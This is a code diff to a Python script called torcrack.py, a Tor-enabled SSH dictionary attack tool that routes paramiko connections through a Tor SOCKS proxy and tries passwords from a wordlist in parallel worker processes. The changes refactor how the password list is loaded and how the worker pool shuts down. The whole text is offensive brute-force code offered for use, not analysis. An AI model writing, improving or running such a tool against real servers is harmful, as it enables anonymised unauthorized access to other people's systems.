@@ -104,7 +104,7 @@ def main():
 	if not os.path.exists("./.logs"):
 		os.makedirs("./.logs")
 	atexit.register(exit_handler)
-	parser = argparse.ArgumentParser(prog='torcrack.py', description='Tor-enabled SSH brute force dictionary attack.')
+	parser = argparse.ArgumentParser(prog='torcrack.py', description='Tor-enabled SSH dictionary attack.')
 	parser.add_argument('tgtHost', type=str, help='target machine')
 	parser.add_argument('-t', '--tgtPort', type=int, help='port to attack on target machine (optional: default 22)', default=22)
 	parser.add_argument('tgtUser', type=str, help='target username')
@@ -159,21 +159,21 @@ def main():
 	print(' [+] Tor circuit established.') 
 	print(' [+] Tor IP: ' + test)
 	paramiko.client.socket.socket = socks.socksocket
-	input_file = open(dictFile)
-	running = 0
-	password = []
-	for j in input_file.readlines():
-		password.append(j.strip('\n'))
-	password.append("^^^break^^^")
+	passwords = []
+	with open(dictFile, 'r') as f:
+		passwords = [l.strip('\n') for l in f]
+	passwords.append("^^^break^^^")
 	print("\n [+] Let's hack the Gibson.\n")
 
 	worker = multiprocessing.Pool(maxThreads, maxtasksperchild=1)
 	try:
-		list(worker.map(ssh_connect, password))
+		list(worker.map(ssh_connect, passwords))
 	except error:
 		worker.terminate()
 		os._exit(1)
 	except notfound:
+		worker.close()
+		worker.join()
 		worker.terminate()
 	else:
 		worker.close()
